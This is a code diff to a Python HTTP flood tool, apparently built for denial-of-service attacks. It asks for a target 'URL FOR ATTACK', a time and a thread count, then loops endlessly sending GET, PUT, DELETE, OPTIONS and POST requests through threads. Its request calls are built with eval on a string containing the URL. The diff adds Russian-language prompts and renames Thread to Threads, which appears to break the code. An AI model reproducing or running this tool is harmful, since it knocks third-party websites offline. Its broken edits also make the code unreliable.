@@ -24,6 +24,8 @@ print("""\033[93m
 """)
 print()
 
+time.sleep(3)
+os.system("clear")
 import os
 import requests
 from tqdm import tqdm
@@ -70,11 +72,11 @@ def menu2():
     {Fore.RESET} ''')
 
 global url, time, file
-url     =     input(f'{Fore.LIGHTGREEN_EX}╰──────| URL FOR ATTACK |──────> {Fore.BLUE}')
+url     =     input(f'{Fore.LIGHTGREEN_EX}╰─────| ССЫЛКА URL FOR ATTACK |──────> {Fore.BLUE}')
 print(f'')
-time    = int(input(f'{Fore.LIGHTGREEN_EX}╰──────| TIMEING ATTACK |──────> {Fore.BLUE} '))
+time    = int(input(f'{Fore.LIGHTGREEN_EX}╰─────| ВРЕМЯ TIMEING ATTACK |──────> {Fore.BLUE} '))
 print(f'')
-threads = int(input(f'{Fore.LIGHTGREEN_EX}╰──────| GHODRAT|──────> {Fore.BLUE}'))
+threads = int(input(f'{Fore.LIGHTGREEN_EX}╰─────| ПОТОКИ [800] THREAD |──────> {Fore.BLUE}'))
 print('')
 
 loop = tqdm(total = 1000, position=0, leave=False)
@@ -97,7 +99,7 @@ def attack(request):
 	while True:
 		try:
 			req = eval("requests."+request+"('"+url+"')")
-			print(f'{Fore.RED} Sending Atack To {Fore.BLUE}{url} {Fore.RED}Thread : {Fore.GREEN}{threads}')
+			print(f'{Fore.RED} Atack To {Fore.BLUE}{url} {Fore.RED}Thread : {Fore.GREEN}{threads}')
 		except:
 			print(f'{Fore.RED} Atack Has Ben Errored')
 		i+=1
@@ -108,11 +110,11 @@ def attack(request):
 def createThreadings():
 	global breakFlag
 	try:
-		Thread(target=lambda: attack("get")).start()
-		Thread(target=lambda: attack("put")).start()
-		Thread(target=lambda: attack("delete")).start()
-		Thread(target=lambda: attack("options")).start()
-		Thread(target=lambda: attack("post")).start()
+		Threads(target=lambda: attack("get")).start()
+		Threads(target=lambda: attack("put")).start()
+		Threads(target=lambda: attack("delete")).start()
+		Threads(target=lambda: attack("options")).start()
+		Threads(target=lambda: attack("post")).start()
 	except:
 		breakFlag = True
 
